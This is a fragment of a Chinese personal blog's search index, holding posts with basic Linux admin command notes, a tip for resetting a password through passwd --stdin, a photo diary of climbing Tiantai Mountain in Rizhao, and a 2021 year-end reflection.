~]# pstree -p |grep httpd<br>           |-httpd(10470)-+-httpd(10474)<br>           |              |-httpd(10475)<br>           |              |-httpd(10476)<br>           |              |-httpd(10477)<br>           |              &#96;-httpd(10478)</p><p>[root@zs ~]# kill 10470&#x2F;&#x2F;杀死进程</p><p>[root@zs ~]# ps aux|grep httpd&#x2F;&#x2F;筛选命令，通过管道符查找httpd服务</p><p>kill -9 46207&#x2F;&#x2F;强制杀死进程,46207为进程号</p><p>df -lh&#x2F;&#x2F;查看磁盘信息:</p><p>free 或free -m &#x2F;&#x2F;查看内存信息</p><p>mpstat -P ALL 1 5&#x2F;&#x2F;查看cpu占用情况: </p><p>#<em>#  (5秒内每隔一秒打印一次CPU占用信息)</em> </p><p>netstat -help&#x2F;&#x2F;查看端口 </p><p>netstat -oan&#x2F;&#x2F;所有端口占用情况 </p><p>#<em># 查看进程  （按内存占用从大到小）</em></p><p>PS-e  -o “%C  : %p : %z : %a”|sort -k5 -nr</p><p>#<em># (按cpu利用率从大到小排列)</em> </p><p>ps-e  -o “%C  : %p : %z : %a”|sort  -nr</p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之明文更改密码</title>
      <link href="/posts/60110"/>
      <url>/posts/60110</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B4.jpg"></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>VMware workstation16</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Red hat 7.4</p><h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><p>🤪🔊</p><ul><li>展现了更改的用户密码</li><li>不需要输入两遍密码</li></ul><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>🤪🔊</p><p>使用echo方法来重置⤵️</p><p><strong>echo “新密码” |passwd –stdin 用户名</strong></p><p>例：修改用户admin密码为workstation123</p><p><img src="/images/Linux%E4%B9%8B%E6%98%8E%E6%96%87%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81/linux%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬山记</title>
      <link href="/posts/52026"/>
      <url>/posts/52026</url>
      
        <content type="html"><![CDATA[<center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1840861309&auto=0&height=66"></iframe></center><center>🕶️风景区同款音乐⇑</center><h1 id="介绍🔝"><a href="#介绍🔝" class="headerlink" title="介绍🔝"></a>介绍🔝</h1><p>中文名：天台山</p><p>位  于：山东省日照市东港区涛雒镇</p><p>出  处：山海经和《竹书纪年》</p><p>环  境：奇花异草遍野，山清水秀</p><p>——更多详情百度百科<a href="https://baike.baidu.com/item/%E5%A4%A9%E5%8F%B0%E5%B1%B1/3574699?fr=aladdin">点击进入</a></p><h1 id="地形🔭"><a href="#地形🔭" class="headerlink" title="地形🔭"></a>地形🔭</h1><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%9C%B0%E5%BD%A2%E5%9B%BE.jpg"></p><h1 id="前续✍"><a href="#前续✍" class="headerlink" title="前续✍"></a>前续✍</h1><p>时间：12&#x2F;02&#x2F;2022下午👓</p><p>——伫立在景区旁的两块石头⤵</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian002.jpg" alt="Time 3:18:37"></p><p>👻👻爬山前，进食两串山药豆子补充补充能量🙊⬇</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian1.jpg" alt="Time 3:18:45"></p><h1 id="观赏✍"><a href="#观赏✍" class="headerlink" title="观赏✍"></a>观赏✍</h1><p>🔊多图警告，注意流量😏</p><h2 id="坐标图⤵"><a href="#坐标图⤵" class="headerlink" title="坐标图⤵"></a>坐标图⤵</h2><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian2.jpg" alt="Time 3:19:46"></p><h2 id="游玩攻略⤵"><a href="#游玩攻略⤵" class="headerlink" title="游玩攻略⤵"></a>游玩攻略⤵</h2><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E6%B8%B8%E7%8E%A9%E6%94%BB%E7%95%A5.jpg" alt="Time 3:21:53"></p><p>道路旁的不知名鸟⤵🎥</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian3.jpg" alt="Time 3:24:21"></p><h2 id="随手拍⤵"><a href="#随手拍⤵" class="headerlink" title="随手拍⤵"></a>随手拍⤵</h2><p>🔊多图警告，注意流量🤪</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian4.jpg" alt="Time 3:25:32"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian5.jpg" alt="Time 3:27:14"></p><h2 id="太阳街市⤵"><a href="#太阳街市⤵" class="headerlink" title="太阳街市⤵"></a>太阳街市⤵</h2><p>介绍：是一个小吃街，也是步行街，可以吃到当地特色小吃。在这里一边逛一边吃，真的是一种享受👋。</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%A4%AA%E9%98%B3%E8%A1%97%E5%B8%82.jpg" alt="Time 3:27:34"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%A4%AA%E9%98%B3%E8%A1%97%E5%B8%826.jpg" alt="Time 3:28:32"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%A4%AA%E9%98%B3%E8%A1%97%E5%B8%82-.jpg" alt="Time 3:29:33"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%A4%AA%E9%98%B3%E8%A1%97%E5%B8%8211.jpg" alt="Time 3:30:15"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian7.jpg" alt="Time 3:31:01"></p><h2 id="扶木宫⤵"><a href="#扶木宫⤵" class="headerlink" title="扶木宫⤵"></a>扶木宫⤵</h2><p>介绍：祈福的地方，在这里可以买到祈福的福袋还有木签，可以在上面写下愿望，然后就可以挂起来了😏</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian8.jpg" alt="Time 3:31:42"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%B1%B12.jpg" alt="Time 3:35:35"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%B1%B13.jpg" alt="Time 3:36:42"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian9.jpg" alt="Time 3:38:13"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian10.jpg" alt="Time 3:38:55"></p><h3 id="扶木一角⤵️"><a href="#扶木一角⤵️" class="headerlink" title="扶木一角⤵️"></a>扶木一角⤵️</h3><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian11.jpg" alt="Time 3:39:31"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian12.jpg" alt="Time 3:40:16"></p><h2 id="出宫⤵️"><a href="#出宫⤵️" class="headerlink" title="出宫⤵️"></a>出宫⤵️</h2><p>🦸🚶🚶‍♂️🚶‍♀️🚶🚶‍♂️🚶‍♀️🚶🚶‍♂️🚶‍♀️</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian14.jpg" alt="Time 3:43:24"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%87%BA%E5%AE%AB1.jpg" alt="Time 3:45:18"></p><p>正在建设的二期工程⤵</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%BB%BA%E8%AE%BE.jpg" alt="Time 3:50:51"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E8%B4%A2%E7%A5%9E1.jpg" alt="Time 3:51:00"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%B7%A5%E7%A8%8B.jpg" alt="Time 3:56:00"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/shu2.jpg" alt="Time 3:57:51"></p><p>离观日台又近了一步😾⤵</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/lu3.jpg" alt="Time 3:58:00"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian16.jpg" alt="Time 4:02:38"></p><h2 id="天台书院⤵"><a href="#天台书院⤵" class="headerlink" title="天台书院⤵"></a>天台书院⤵</h2><p>介绍：静心好地方，抄经文，诵读一下经典，会感到被净化了。🍴</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian17.jpg" alt="Time 4:07:53"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian18.jpg" alt="Time 4:08:10"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian19.jpg" alt="Time 4:09:10"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E4%B9%A6%E9%99%A2.jpg" alt="Time 4:11:53"></p><h1 id="爬山✍"><a href="#爬山✍" class="headerlink" title="爬山✍"></a>爬山✍</h1><p>由于走错了道路(下山路硬生生走成了上山路)，完美跟更多景观错过【裂】🤪🤪</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/%E5%AF%BC%E8%88%AA.jpg" alt="😵"></p><p>时间不允许重来呀！行人逐渐变少道路通畅直冲山顶🐎冲冲冲 🕓</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian20.jpg" alt="Time 4:23:04"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian21.jpg" alt="Time 4:25:00"></p><p>登顶✊👽会当凌绝顶，一览众山小😃</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian23.jpg" alt="Time 4:31:15"></p><p>山上真凉快℃</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian24.jpg" alt="Time 4:34:11"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian25.jpg" alt="Time 4:36:08"></p><h2 id="太阳神石⤵"><a href="#太阳神石⤵" class="headerlink" title="太阳神石⤵"></a>太阳神石⤵</h2><p>介绍：神石直径约3米，重约20余吨，矗立在裸露山岩之上，给人一种摇摇欲坠之感。神石形成的年代无考，据石下一侧雨水冲刷深沟判断，应有几十万年甚至几百万年之历史。⤵</p><p>🐾🐾传说太阳神石乃大羿射日时落到天台山的一个太阳，有神性，非常灵验，故名太阳神石。宋唐时期，财神崇拜兴起，道教有日精托化财神赵公明之说，故人们在神石一侧修建财神庙，香火绵延。</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian26.jpg" alt="Time 4:37:13"></p><h2 id="观日台⤵"><a href="#观日台⤵" class="headerlink" title="观日台⤵"></a>观日台⤵</h2><p>🕺🕺介绍：观日台位于天台山顶峰处，海拔高度260米，高度约12米，台上环形构筑物高度约13.5米，整体建筑高度约25.5米；观日台以原始祀日文化功能为立足点，巧妙融合日月星辰文化元素，布设文化标志、天文观赏、逐日天梯等文化景观，具有祭祀祈福、舞台演艺、夜间灯光、科普研学等文化功能。</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian27.jpg" alt="Time 4:45:11"></p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian28.jpg" alt="Time 4:49:19"></p><p>观察完一遍，🕔天黑前火速下山🏃🏃‍♂️🏃‍♀️</p><p><img src="/images/%E6%97%A5%E7%85%A7%E5%A4%A9%E5%8F%B0%E5%B1%B1/tian29.jpg" alt="Time 4:58:19"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年度总结</title>
      <link href="/posts/8f6f"/>
      <url>/posts/8f6f</url>
      
        <content type="html"><![CDATA[<center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1842025914&auto=0&height=66"></iframe></center><h1 id="2021年度总结"><a href="#2021年度总结" class="headerlink" title="2021年度总结"></a>2021年度总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直自己想写一篇年度总结，结果拖延症发作拖到了14&#x2F;02&#x2F;2022这天。🤏</p><p>浏览搜索发现GitHub有个<a href="https://github.com/saveweb/review-2021">仓库</a>收录年度总结👍</p><p><img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/%E6%90%9C%E7%B4%A2.jpg"></p><h2 id="关于学业"><a href="#关于学业" class="headerlink" title="关于学业"></a>关于学业</h2><p>时间飞逝……….2021年是在济南上学的第二年。按照职院传统在第三年的时候就要出去实习，在校学生生涯也要马上结束了。学业无成，年少无为</p><p>2021年总体来说在学习上摇头晃脑不太认真，真正学习到大脑的知识也是空空如也。思想上懒惰，使大脑形成了本能反应。</p><p>造成学业问题上的绊脚石有：没有学习<strong>耐心</strong>、钻研的<strong>耐心</strong>。</p><p>耐心的丧失，让wo学习堕落为拖延症埋下了罪恶的种子。</p><h2 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h2><p>2021下半年喜欢上了跑步👟👟。</p><p>🤾🤾‍♂️🤾‍♀️get到了跑步的“魅力”特别是心情低落时，跑完步之后，就会有一种豁然开朗的感觉，内心可以寂静，仿佛所有的一切都与你无关。</p><p>其余没有太大变化，一贯保持吃好、喝好、睡好、玩好的作风。</p><p>睡觉这方面：持续性熬夜，间接性自闭，做梦式暴富，习惯性自愈。</p><h2 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h2><p>随心、随缘、随势、不挽留、不讨好、不争吵、不记仇🐸</p><h2 id="一些时刻"><a href="#一些时刻" class="headerlink" title="一些时刻"></a>一些时刻</h2><p>2021年4月9日学校受欢迎的大白鹅。🦢⤵</p><p><img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/2021.5.1.jpg"></p><p>2021年11月14日学校封校，站在高处瞭望观察外面的世界。👁️⤵</p><p><img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/2021.11.14.jpg"></p><p>2021年12月19日学校的火车，很喜欢的一张照片🚅⤵</p><p><img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/2021.12.19.jpg"></p><p>2021年7月30日拍摄于古城⛩️⤵</p><p><img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/2021.7.30.jpg"></p><p>2021年8月30日家乡的道路🚭⤵</p><p><img src="/images/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/2021.8.30.jpg"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>✍✍一年里发生了很多事，有好有坏，不变的是时间岁月流逝，在<font color=red size=5>2022</font> 年用更好的心态迎接每一次变化。为自己的梦想而加油、而疯狂吧！Crazy For You👺</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
